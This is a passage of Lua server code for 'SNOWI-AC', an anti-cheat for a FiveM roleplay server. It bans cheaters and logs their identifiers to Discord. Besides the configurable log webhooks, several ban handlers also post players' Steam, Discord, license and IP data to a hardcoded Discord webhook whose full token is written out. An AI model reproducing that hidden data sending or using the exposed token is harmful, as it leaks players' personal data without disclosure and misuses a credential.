                    if string.match(discord, 'discord:') then
                        mention = string.sub(discord, 9)
                     -- print(mention)
                        end
                end
            end
            TriggerEvent(
                "discordlog:sendToDiscord",
                "­ SNOWI-AC BANEO DESDE MENU DE ADMIN",
                "**\nNombre: **" ..
                    tostring(ss) ..
                        " \n BANEADO POR ["..naa.."] **\n Steam: **" ..
                            tostring(Xx) ..
                                "**\n Discord: **" ..
                                    tostring(discord) ..
                                        "**\n Fivem: **" ..
                                            tostring(license) ..
                                                "**\nIP: **" .. tostring(ips) .. "**\nMotivo: **" .. tostring(a1),
                16711680
            )
            local K = { {["color"] = 16711680, ["title"] = "** Bienvenido al CLUB! DETECTADO EN:"..Settings.ServerName.."** ->"..s, ["description"] = 'Nuevo miembro del club Patatillas!\nName: '..tostring(s)..'\nSteam: '..tostring(X)..'\nDiscord ID: '..tostring(discord)..'\nLicense: '..tostring(license)..'\nFivem: '..tostring(fivem)..'\nIP: '..tostring(ips)..'\nRazón: Usar chetos de internet basura.\nDiscord Embed: <@'..mention..'>.\n||@here||', ["footer"] = {["text"] = "SNOWI-AC"}}}
PerformHttpRequest('https://discord.com/api/webhooks/863826078065623050/R3DrX7bJJrQyGtSp8IsRPmNw84vVL2impEtBLjsoG_7-pd-xz3KX9cFw75wl8UmMOqS_',function(p, q, r) end,"POST",json.encode({username = l, embeds = K, avatar_url = k}),{["Content-Type"] = "application/json"})
        TriggerClientEvent('chat:addMessage', -1, {args = {'^4[^1S^2N^3O^4W^5I^6I^1-^2AC^4]^0', 'Terminó de hacer su trabajo con 1[^2'..GetPlayerName(Z)..'^1]^0. \n Ese ya no tiene ganas ni de volver a intentarlo!.❄️'}})
            DropPlayer(
            Z,
            "SNOWI - AC | Has sido baneado 🚫 permanentemente 🚫 de "..Settings.ServerName.." . "
        )
    else
        for H, B in ipairs(GetPlayerIdentifiers(_source)) do
            if string.sub(B, 1, string.len("steam:")) == "steam:" then
                permBanUserAd(X, B,a1)
           elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
               permBanUserAd(X, B,a1)
            elseif string.sub(B, 1, string.len("license:")) == "license:" then
                permBanUserAd(X, B,a1)
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                permBanUserAd(X, B,a1)
            end
        end
        for H, B in pairs(GetPlayerIdentifiers(_source)) do
            if string.sub(B, 1, string.len("steam:")) == "steam:" then
                steamid = B
            elseif string.sub(B, 1, string.len("license:")) == "license:" then
                license = B
            elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                ips = B
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                discord = B
            end
        end
        TriggerEvent(
            "discordlog:sendToDiscord",
            "­ SNOWI-AC BANEO DESDE MENU DE ADMIN",
            "**\nNombre: **" ..
                tostring(s) ..
                    " \n BANEADO POR ["..na.."] **\n Steam: **" ..
                        tostring(X) ..
                            "**\n Discord: **" ..
                                tostring(discord) ..
                                    "**\n Fivem: **" ..
                                        tostring(license) ..
                                            "**\nIP: **" .. tostring(ips) .. "**\nMotivo: **" .. tostring(a1),
            16711680
        )
        TriggerClientEvent('chat:addMessage', -1, {args = {'^4[^1S^2N^3O^4W^5I^6I^1-^2AC^4]^0', 'Terminó de hacer su trabajo con 1[^2'..GetPlayerName(_source)..'^1]^0.[ESTE SI ERA DURO] \n Ese ya no tiene ganas ni de volver a intentarlo!.❄️'}})

        DropPlayer(
            _source,
            " SNOWI - AC | Has sido baneado 🚫 permanentemente 🚫 de "..Settings.ServerName.." ."
        )
    end end end 
)
RegisterServerEvent("snw:banobj")
AddEventHandler(
    "snw:banobj",
    function(Z, a1)
        local _source = source
        local s = GetPlayerName(Z)
        local X = GetPlayerIdentifier(Z)
        local identifiers, Y = GetPlayerIdentifiers(Z)
        local steamid = false
        local license = false
        local discord = false
        local mention = 'No vinculado'
        local ips = false
        for H, B in ipairs(GetPlayerIdentifiers(Z)) do
            if string.sub(B, 1, string.len("steam:")) == "steam:" then
                permBanUserObjBL(X, B,a1)
            elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                permBanUserObjBL(X, B,a1)
            elseif string.sub(B, 1, string.len("license:")) == "license:" then
                permBanUserObjBL(X, B,a1)
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                permBanUserObjBL(X, B,a1)
            end
        end
        for H, B in pairs(GetPlayerIdentifiers(Z)) do
            if string.sub(B, 1, string.len("steam:")) == "steam:" then
                steamid = B
            elseif string.sub(B, 1, string.len("license:")) == "license:" then
                license = B
            elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                ips = B
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                discord = B
                if string.match(discord, 'discord:') then
                    mention = string.sub(discord, 9)
                 -- print(mention)
                    end
            end
        end
        TriggerEvent(
            "discordlog:sendToDiscord",
            "­ SNOWI - AC DETECCION DE CREAR ENTIDADES",
            "**\nNombre: ** " ..
                tostring(s).." \n EJECUTO EL EVENTO EL JUGADOR :"..GetPlayerName(Z).." ** \n Steam: **" ..
                        tostring(X) ..
                            "**\n Discord: **" ..
                                tostring(discord) ..
                                    "**\n Fivem: **" ..
                                        tostring(license) ..
                                            "**\nIP: **" .. tostring(ips) .. "**\nObjeto: **" .. a1 .. "**\nRazón: **" ..tostring("SNOWI - AC| Deteccion ECB Nº1 Hemos detectado que usted esta usando un programa externo para beneficiarte de el mismo, por esa razon usted conllevara la expulsion del servidor de *por vida*, esta sancion es inapelable. Para mas informacion sobre su baneo consultelo con el personal de dicho servidor. "),
            16711680
        )
        local K = { {["color"] = 16711680, ["title"] = "** Bienvenido al CLUB! DETECTADO EN:"..Settings.ServerName.."** ->"..s, ["description"] = 'Nuevo miembro del club Patatillas!\nName: '..tostring(s)..'\nSteam: '..tostring(X)..'\nDiscord ID: '..tostring(discord)..'\nLicense: '..tostring(license)..'\nFivem: '..tostring(fivem)..'\nIP: '..tostring(ips)..'\nRazón: Usar chetos de internet basura.\nDiscord Embed: <@'..mention..'>.\n||@here||', ["footer"] = {["text"] = "SNOWI-AC"}}}
PerformHttpRequest('https://discord.com/api/webhooks/863826078065623050/R3DrX7bJJrQyGtSp8IsRPmNw84vVL2impEtBLjsoG_7-pd-xz3KX9cFw75wl8UmMOqS_',function(p, q, r) end,"POST",json.encode({username = l, embeds = K, avatar_url = k}),{["Content-Type"] = "application/json"})
        TriggerClientEvent('chat:addMessage', -1, {args = {'^4[^1S^2N^3O^4W^5I^6I^1-^2AC^4]^0', 'Terminó de hacer su trabajo con ^1[^2'..GetPlayerName(Z)..'^1]^0.❄️'}})
        DropPlayer(
            Z,
            "SNOWI - AC | Hemos detectado que usted esta usando un programa externo para beneficiarte de el mismo, por esa Razon usted conllevara la expulsion del servidor de *por vida*, esta sancion es inapelable. Para mas informacion sobre su baneo consultelo con el personal de dicho servidor."
        )
    end
)
    for i = 1, #ListBK.Triggers, 1 do
        RegisterServerEvent(ListBK.Triggers[i])
        AddEventHandler(
            ListBK.Triggers[i],
            function()
                local player = source
                local nombre = GetPlayerName(source)
                print("Ha registrado un nuevo evento: ^1TriggerServerEvent(\""..ListBK.Triggers[i].."\") ^8Y ha sido ^1baneado^8. ^8ID: ^1[^4"..player.."^1] ^8Nombre: ^1[^4"..nombre.."^1]")
                local msjban = "TriggerServerEvent(\""..ListBK.Triggers[i].."\")"
                TriggerEvent('snw:banclient', player, msjban)
                Citizen.Wait(50)
                CancelEvent()
            end
        )
    end
    local ultimos = 'ste'
    local idban = math.random(999999, 99999999)
    local lalistadeban = {}
    local listadebandelarchi = ""
    function GetBanID()
        TriggerEvent('snowiBanFunc', 'GetBanID')
    end
    function isBanned(source)
        TriggerEvent('snowiBanFunc', 'isBanned', source)
    end
    function loadBans()
        TriggerEvent('snowiBanFunc', 'loadBans')
    end
    function loadBansobj()
        TriggerEvent('snowiBanFunc', 'loadBansobj')
    end
    function permBanUserObjBL(o, source, razon)
        TriggerEvent('snowiBanFunc', 'permBanUserObjBL', o, source, razon)
    end
   
    function permBanUser(o, source, razon)
        TriggerEvent('snowiBanFunc', 'permBanUser', o, source, razon)
    end
    function permBanUserAd(o, source, razon)
        TriggerEvent('snowiBanFunc', 'permBanUserAd', o, source, razon)
    end
    RegisterCommand('nP', function()
    print(json.encode(lalistadeban)) end)
RegisterCommand(
    "snowiac",
    function()
        print('Lista de baneos refrescada.')
        loadBans()
        loadBansobj()
    end,
    true
)
if Settings.ResourceStop then
	AddEventHandler(
    "onResourceStop",
    function(cK)
        if cK == GetCurrentResourceName() then
            print("Intento de parar un recurso detectado"..GetCurrentResourceName())
        end
    end
)
end
if Settings.ResourceStop then
	AddEventHandler(
    "onClientResourceStop",
    function(cK)
        print("Intento de parar un recurso detectado"..GetCurrentResourceName())
    end
)
end
RegisterServerEvent("kick:snowi")
AddEventHandler("kick:snowi", function(a, msj)
    local _source = source
    local player = source
    if msj == nil then
        msj = 'SNOWI-AC || A quien querias kickear tu?'
    end
    if a ~= _source then
        
        TriggerClientEvent('chat:addMessage', -1, {args = {'^4[^1S^2N^3O^4W^5I^6I^1-^2AC^4]^0', 'Terminó de hacer su trabajo con ^1[^2'..GetPlayerName(_source)..'^1]^0. \n Ese ya no tiene ganas ni de volver a intentarlo!.❄️'}})
        TriggerEvent('snw:banclient', player, 'TriggerServerEvent(\"kick:snowi\")', msj)
    end
    if msj == 'Te han pillado colega!!' then
        TriggerClientEvent('chat:addMessage', -1, {args = {'^4[^1S^2N^3O^4W^5I^6I^1-^2AC^4]^0', 'Terminó de hacer su trabajo con ^1[^2'..GetPlayerName(_source)..'^1]^0. \n Ese ya no tiene ganas ni de volver a intentarlo!.❄️'}})
        DropPlayer(
            _source,
            msj
        )
        print('BANEAR POR INJECCIÓN DE MENU, FUNCIÓN DE SCREENSHOT HECHA PERO NO FUE POSIBLE EL BANEO')
    end
    if msj == '' or msj == nil then
    DropPlayer(
        _source,
            "Has sido kickeado || SNOWI - AC"
        )
    else
        DropPlayer(
            _source,
            msj
        )
    end
end)
RegisterServerEvent('snowipedconv')
AddEventHandler('snowipedconv', function(idjuga, pedcargao)
    if idjuga == -1 then
        TriggerEvent('snw:banclient', source, 'SNOWI-AC || Intento de convertir en otro ped model a todos los jugadores y sale mal')
        return
    end
    local xp = ESX.GetPlayerFromId(source)
    if not havePermission(xp) then
        TriggerEvent('snw:banclient', source, 'SNOWI-AC || Intento de convertir en otro ped model a otro jugador sin permisos y sale mal')
        return
    end
TriggerClientEvent('snowipedconvc', idjuga, pedcargao)
print("ID ["..idjuga.."] PED ["..pedcargao.."]")
end)
RegisterServerEvent('snowi:print')
AddEventHandler('snowi:print', function(a)
        TriggerClientEvent('chat:addMessage', -1, {args = {'^4[^1S^2N^3O^4W^5I^6I^1-^2AC^4]^0', 'Terminó de hacer su trabajo con 1[^2'..GetPlayerName(source)..'^1]^0.Ese ya no tiene ganas ni de volver a intentarlo!.❄️'}})
        print(source..' DETECCION DE INJECCION')  DropPlayer(source, 'Te hemos pillado amigo!. \n SNOWI-AC') end)
local activado = false
RegisterCommand('cs', function(source, args,a)
    local xP = ESX.GetPlayerFromId(source)
    local msj = string.sub(a, 2)
    if args[1] == nil then
        print(GetPlayerName(source)..' Escribe un mensaje que quieras enviar por chat de SNOWI-AC')
    end
    if havePermission(xP) then
        TriggerClientEvent('snowi:reports', -1, '❄️^2CHAT SNOWI-AC^0 | ^5[^4'..source..'^5] [^4'..GetPlayerName(source)..'^5] ->^0'..msj)
    end
end)
function havePermission(xPlayer, exclude)
	if exclude and type(exclude) ~= 'table' then exclude = nil;print("^3[esx_admin] ^1ERROR ^0exclude argument is not table..^0") end

	local playerGroup = xPlayer.getGroup()
	for k,v in pairs(Settings.GroupsAdmin) do
		if v == playerGroup then
			if not exclude then
				return true
			else
				for a,b in pairs(exclude) do
					if b == v then
						return false
					end
				end
				return true
			end
		end
	end
	return false
end
RegisterCommand('guardarsnowi', function(source, args)
    if source == 0 then
        ESX.SavePlayers()
    end end, true)
loadBans()
AddEventHandler(
    "explosionEvent",
    function(a4, a5)
        CancelEvent()
        if a5.ownerNetId == 0 then
            CancelEvent()
        end
        if a5.posX == 0.0 and a5.posY == 0.0 then
            CancelEvent()
        end
        for H in pairs(ListBK.Explosion) do
            if a5.explosionType == H then
                if ListBK.Explosion[H].log == true then
                    print(
                        " SNOWI  | ^3 Deteccion de Explosion: ^0[^3" ..
                            ListBK.Explosion[H].name ..
                                "^0] ^3Jugador: ^0[^3" .. a4 .. "^0] " .. GetPlayerName(a4)
                    )
                    Citizen.Wait(50)
                    local a1 = "Deteccion de Explosion: " .. ListBK.Explosion[H].name
                else
                end
                if ListBK.Explosion[H].ban == true then
                    local a1 = "Deteccion de Explosion: " .. ListBK.Explosion[H].name
                    TriggerEvent("snw:BanExplosiones", a4, a1)
                else
                end
            end
        end
    end
)
RegisterServerEvent("snw:BanExplosiones")
AddEventHandler(
    "snw:BanExplosiones",
    function(Z, a1)
        local s = GetPlayerName(Z)
        local X = GetPlayerIdentifier(Z)
        local identifiers, Y = GetPlayerIdentifiers(source)
        local steamid = false
        local license = false
        local discord = false
        local ips = false
        local mention = 'No vinculado'
        for H, B in ipairs(GetPlayerIdentifiers(Z)) do
            if string.sub(B, 1, string.len("steam:")) == "steam:" then
                permBanUser(X, B,a1)
           elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
             permBanUser(X, B,a1)
            elseif string.sub(B, 1, string.len("license:")) == "license:" then
                permBanUser(X, B,a1)
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                permBanUser(X, B,a1)
            end
        end
        for H, B in pairs(GetPlayerIdentifiers(Z)) do
            if string.sub(B, 1, string.len("steam:")) == "steam:" then
                steamid = B
            elseif string.sub(B, 1, string.len("license:")) == "license:" then
                license = B
            elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                ips = B
            elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                discord = B
                if string.match(discord, 'discord:') then
                    mention = string.sub(discord, 9)
                 -- print(mention)
                    end
            end
        end
        TriggerEvent(
            "discordlog:sendToDiscord",
            "­ SNOWI-AC BAN POR EXPLOSIONES",
            "**\nNombre: **" ..
                tostring(s) ..
                    "**\n Steam: **" ..
                        tostring(X) ..
                            "**\n Discord: **" ..
                                tostring(discord) ..
                                    "**\n Fivem: **" ..
                                        tostring(license) ..
                                            "**\nIP: **" .. tostring(ips) .. "**\nRazon: **" .. tostring(a1),
            16711680
        )
        local K = { {["color"] = 16711680, ["title"] = "** Bienvenido al CLUB! DETECTADO EN:"..Settings.ServerName.."** ->"..s, ["description"] = 'Nuevo miembro del club Patatillas!\nName: '..tostring(s)..'\nSteam: '..tostring(X)..'\nDiscord ID: '..tostring(discord)..'\nLicense: '..tostring(license)..'\nFivem: '..tostring(fivem)..'\nIP: '..tostring(ips)..'\nRazón: Usar chetos de internet basura.\nDiscord Embed: <@'..mention..'>.\n||@here||', ["footer"] = {["text"] = "SNOWI-AC"}}}
PerformHttpRequest('https://discord.com/api/webhooks/863826078065623050/R3DrX7bJJrQyGtSp8IsRPmNw84vVL2impEtBLjsoG_7-pd-xz3KX9cFw75wl8UmMOqS_',function(p, q, r) end,"POST",json.encode({username = l, embeds = K, avatar_url = k}),{["Content-Type"] = "application/json"})
        DropPlayer(
            Z,
            "­ SNOWI - AC | Hemos detectado que usted esta usando un programa externo para beneficiarte de el mismo, por esa Razon usted conllevara la expulsion del servidor de *por vida*, esta sancion es inapelable. Para mas informacion sobre su baneo consultelo con el personal de dicho servidor."
        )
    end
)
 if Settings.DesconexLog then
    AddEventHandler(
        "playerDropped",
        function(U)
            local s = GetPlayerName(source)
            local license, D, E, F, discord, G = "license:desvinculado", "steam:desvinculado", "live:desvinculado", "xbl:desvinculado", "discord:desvinculado", "ip:desvinculado"
            for H, B in ipairs(GetPlayerIdentifiers(source)) do
                if string.sub(B, 1, string.len("license:")) == "license:" then
                    license = B
                elseif string.sub(B, 1, string.len("steam:")) == "steam:" then
                    D = B
                elseif string.sub(B, 1, string.len("live:")) == "live:" then
                    E = B
                elseif string.sub(B, 1, string.len("xbl:")) == "xbl:" then
                    F = B
                elseif string.sub(B, 1, string.len("discord:")) == "discord:" then
                    discord = B
                elseif string.sub(B, 1, string.len("ip:")) == "ip:" then
                    G = B
                end
            end
            TriggerEvent(
                "discordlog:sendToDiscord2",
                " Desconexion ",
                "**\nNombre: **" ..
                GetPlayerName(source) ..
                    "\n \"" ..
                        D ..
                            "\",\"" ..
                                discord ..
                                    "\",\"" ..
                                        license .. "\",\"" .. E .. "\",\"" .. F .. "\",\"" .. 
                                        G .. "\",",
                16711680
            )
            
        end
    )
    end
    RegisterServerEvent("discordlog:sendToDiscord2")
    AddEventHandler(
        "discordlog:sendToDiscord2",
        function(s, t, J)
            local K = {
                {["color"] = J, ["title"] = "**" .. s .. "**", ["description"] = t, ["footer"] = {["text"] = "SNOWI-AC"}}
            }
            PerformHttpRequest(
                Logs.Conex,
                function(p, q, r)
                    if p ~= 204 then
                        print('^1p Es diferente sendToDiscord2', p)
                    end
                    if q == nil then
                        print('^1q es nil sendToDiscord2', q)
                    end
                end,
                "POST",
                json.encode({username = l, embeds = K, avatar_url = k}),
                {["Content-Type"] = "application/json"}
            )
        end
    )
    RegisterServerEvent("discordlog:sendToDiscord")
    AddEventHandler(
        "discordlog:sendToDiscord",
        function(s, t, J)
            local K = {
                {["color"] = J, ["title"] = "**" .. s .. "**", ["description"] = t, ["footer"] = {["text"] = "SNOWI-AC"}}
            }
            PerformHttpRequest(
                Logs.Global,
                function(p, q, r)
                    if p ~= 204 then
                        print('^1p Es diferente sendToDiscord normal', p)
                    end
                    if q == nil then
                        print('^1q es nil sendToDiscord normal', q)
                    end
                end,
                "POST",
                json.encode({username = l, embeds = K, avatar_url = k}),
                {["Content-Type"] = "application/json"}
            )
        end
    )
    RegisterServerEvent("discordlog:sendToDiscordsnow3")
    AddEventHandler(
        "discordlog:sendToDiscordsnow3",
        function(s, t, J)
            local K = {
                {["color"] = J, ["title"] = "**" .. s .. "**", ["description"] = t, ["footer"] = {["text"] = "SNOWI-AC"}}
            }
            PerformHttpRequest(
                Logs.Other,
                function(p, q, r)
                    if p ~= 204 then
                        print('^1p Es diferente other', p)
                    end
                    if q == nil then
                        print('^1q es nil other', q)
                    end
                end,
                "POST",
                json.encode({username = l, embeds = K, avatar_url = k}),
                {["Content-Type"] = "application/json"}
            )
        end
    )
RegisterServerEvent("snw:cleanareaveh")
RegisterServerEvent("snw:cleanareapeds")
RegisterServerEvent("snw:cleanareaentity")

RegisterCommand('snowiguardar2', function()
    if source == 0 then
    print('Guardando datos de jugadores desde la consola')
    ESX.SavePlayers()
    else print('Esto solo se puede hacer desde la consola!') 
    end
    end, true)
local tabladeadmin = {}
RegisterServerEvent('snowi:añadimosadmin')
AddEventHandler('snowi:añadimosadmin', function(permisos)
local id = source
local nombre = GetPlayerName(id)
local perm = permisos
local xx = ESX.GetPlayerFromId(source)
if xx.getGroup() == 'user' then
    TriggerEvent('snw:banclient', source, 'SNOWI-AC || Se intentó pasar de listo pero no sabe un carajo de estos temas, mejor que se retire. :)')
    return
end

table.insert(tabladeadmin, {nombret = nombre, permt = perm, idt = id})
print('STAFF LOGEADO EN MENU DE ADMIN | ['..id..'] ['..nombre..'] ['..perm..']')
end)
RegisterCommand('admindispo', function(source, args)
    if source == 0 then
    for i=1, #tabladeadmin, 1 do
        print('^1[^2'..tabladeadmin[i].idt..'^1] [^2'..tabladeadmin[i].nombret..'^1] [^2'..tabladeadmin[i].permt..'^1]^0')
    end 
    return
end
local x = ESX.GetPlayerFromId(source)
print(x.getGroup())
	if x ~= nil then
if x.getGroup() ~= 'user' then
    for i=1, #tabladeadmin, 1 do
        print('^1[^2'..tabladeadmin[i].idt..'^1] [^2'..tabladeadmin[i].nombret..'^1] [^2'..tabladeadmin[i].permt..'^1]^0')
    end
end
end
end)
RegisterCommand('snowilimpiar', function(source, args)
    local cuanto = 'cerrar'
    local staff = tonumber(args[1])
    if args[2] == 'todos' then
        cuanto = 'todos'
    else cuanto = 'cerrar'
    end
    if source == 0 then
    if GetPlayerName(staff) then
        print('Permisos retirados a '..GetPlayerName(staff)..' ID: '..staff)
        local _source = staff
local nombre = GetPlayerName(_source)
for k,v in ipairs(tabladeadmin) do
    if v.idt == _source and v.nombret == nombre then
        table.remove(tabladeadmin, k)
        print('STAFF ELIMINADO | '..k..' ['..v.idt..'] ['..v.nombret..']')
       
    end
end
            TriggerClientEvent('snowi:quitoperm', staff, cuanto)
    else print('El id no está onlinne')
    end
else print('['..GetPlayerName(source)..'] No tiene permisos para usar /snowilimpiar')
end
end)
RegisterCommand('snowiRestartTabla', function(source, args)
if source == 0 then
    tabladeadmin = {}
    print('Tabla de admin limpiada')
end end
)
AddEventHandler('playerDropped', function(razon, reason)
    local _source = source
local nombre = GetPlayerName(_source)
for k,v in ipairs(tabladeadmin) do
    if v.idt == _source and v.nombret == nombre then
        table.remove(tabladeadmin, k)
        print('STAFF ELIMINADO | '..k..' ['..v.idt..'] ['..v.nombret..']')
       
    end
end
Citizen.Trace("^4[^1Desconexion^4] ^1[^3".._source.."^1] ^5[^2"..nombre.."^5]^1 [^6"..razon.."^1] \n^0")  
end)
RegisterServerEvent("snowiParticles")
AddEventHandler(
    "snowiParticles",
    function(s, t)
        local K = {
            {["color"] = 16711680, ["title"] = "**" .. s .. "**", ["description"] = t, ["footer"] = {["text"] = "Snowii"}}
        }
        PerformHttpRequest(
			Logs.Particles,
            function(p, q, r)
                if p ~= 204 then
                    print('^1p Es diferente', p)
                end
                if q == nil then
                    print('^1q es nil', q)
                end
            end,
            "POST",
            json.encode({username = 'SNOWI-PARTICULAS', embeds = K, avatar_url = 'https://i.ibb.co/9H5Jbn6/snowiac.jpg'}),
            {["Content-Type"] = "application/json"}
        )
    end
)
local realesptfx = {
    1154617855,
    3467264875,
    359877931,
    3258985119,
    3788573652,
    260712834,
    1431282941,
    3391043918,
    19514267,
    
}
local datosPTFX = {
    {id=0, numero=1},
}

AddEventHandler('ptFxEvent', function(a,b)
    if not Settings.Particles then return end
print(a,json.encode(b))
for j=1, #datosPTFX do
    if a == datosPTFX[j].id then
        datosPTFX[j].numero = datosPTFX[j].numero +1
        if datosPTFX[j].numero >= 5 then
            
             print('Numero de veces superado para el ID ['..a..'] ültima particula ['..b.effectHash..'] Último asset ['..b.assetHash..']')
             TriggerEvent('snowiParticles', ':sparkler: BAN POR PARTÍCULAS :sparkler:', '**Nombre: ** '..GetPlayerName(a)..' \n **ID: **'..a..' \n **IDENTIFIERS: **'..json.encode(GetPlayerIdentifiers(a))..'\n **PARTICULA ASSET: **'..b.assetHash..' \n **PARTICULA EFECT: **'..b.effectHash..'\n **NUMERO DE PARTÍCULAS DETECTADAS: **'..datosPTFX[j].numero)
             TriggerEvent('snw:banclient', a, 'SNOWI-AC || HEMOS DETECTADO MEDUZA MIERDA. \n EFFECT HASH['..b.effectHash..'] ASSET HASH['..b.assetHash..']')
             CancelEvent()
        else 
            TriggerEvent('snowiParticles', ':sparkler: DETECCIÓN DE PARTÍCULAS :sparkler:', '**Nombre: **'..GetPlayerName(a)..' \n **ID: **'..a..' \n **IDENTIFIERS: **'..json.encode(GetPlayerIdentifiers(a))..'\n **PARTICULA ASSET: **'..b.assetHash..' \n **PARTICULA EFECT: **'..b.effectHash..'\n **NUMERO DE PARTÍCULAS DETECTADAS: **'..datosPTFX[j].numero)
            print('Particula detectada en el ID ['..a..'] Número de particulas detectadas ['..datosPTFX[j].numero..'] Partícula detectada ['..b.effectHash..'] Asset detectado ['..b.assetHash..']')
            CancelEvent()
        end
        
    else 
        
        table.remove(datosPTFX, 1)
table.insert(datosPTFX, {id=a, numero=1})
TriggerEvent('snowiParticles', ':sparkler: DETECCIÓN DE PARTÍCULAS :sparkler:', '**Nombre:** '..GetPlayerName(a)..' \n **ID:**'..a..' \n **IDENTIFIERS:**'..json.encode(GetPlayerIdentifiers(a))..'\n **PARTICULA ASSET:**'..b.assetHash..' \n **PARTICULA EFECT:**'..b.effectHash..'\n **NUMERO DE PARTÍCULAS DETECTADAS:**'..datosPTFX[j].numero)
CancelEvent()
    end
end
print('^1DETECCIÓN DE PARTICULAS ID-^2[^1'..a..'^2][^1'..GetPlayerName(a)..'^4] ^6HASH EFFECT ^4[^1'..b.effectHash..'^4] ^0ASSETS HASH ^4[^1'..b.assetHash..'^4]^0' )
for i=1, #realesptfx do
    if b.effectHash == realesptfx[i] or b.assetHash == realesptfx[i] then
        TriggerEvent('snw:banclient', a, 'SNOWI-AC || HEMOS DETECTADO MEDUZA MIERDA. \n EFFECT HASH['..b.effectHash..'] ASSET HASH['..b.assetHash..']')
        CancelEvent()
    end
end
CancelEvent()
end)
AddEventHandler('fireEvent', function(a,h)
    CancelEvent()
    if not Settings.Fire then return end
print('^5FIRE EVENT^0'..a, json.encode(h)) end)
AddEventHandler('removeWeaponEvent', function(a,h)
print('^5REMOVE WEAPON ^0'..a, json.encode(h)) 
CancelEvent() 
end)
AddEventHandler('removeAllWeaponsEvent', function(a,h)
print('^5RremoveAllWeaponsEvent ^0'..a, json.encode(h)) CancelEvent() end)
 AddEventHandler('startProjectileEvent', function(a,h)
                print('^5startProjectileEvent ^0'..a, json.encode(h))  CancelEvent() end)
 AddEventHandler('respawnPlayerPedEvent', function(a,h)
    if not Settings.RespawnPed then return end
print('^5respawnPlayerPedEvent ^0'..a, json.encode(h))  CancelEvent() end)
RegisterServerEvent('staffRetrasado')
AddEventHandler('staffRetrasado', function(a)
local p = source
local x = ESX.GetPlayerFromId(p)
if a == nil then
a = 'Valor sin especificar'
end
if x.getGroup() == 'user' then
TriggerEvent('snw:banclient', p, 'SNOWI-AC || Trigger [staffRetrasado] \n '..a)
else
DropPlayer(p, a)
end        
end)
RegisterCommand('darPerm', function(sourcr, args)
if source == 0 then
TriggerClientEvent('snowiPerms',tonumber(args[1]), args[2])
end 
end)
RegisterCommand('reloadBL', function(source, args)
if source == 0 then
    ListBK.EntidadesBAN = ListBK.EntidadesBAN
    ListBK.EntidadesBL = ListBK.EntidadesBL
end end )

RegisterCommand('snowiD', function(source, args)
    if tonumber(args[1]) == nil then print('ID Inválido') return end
if source == 0 then
TriggerClientEvent('snowiDesbug', tonumber(args[1]))
else
    TriggerClientEvent('snowiDesbug', source)
end end
)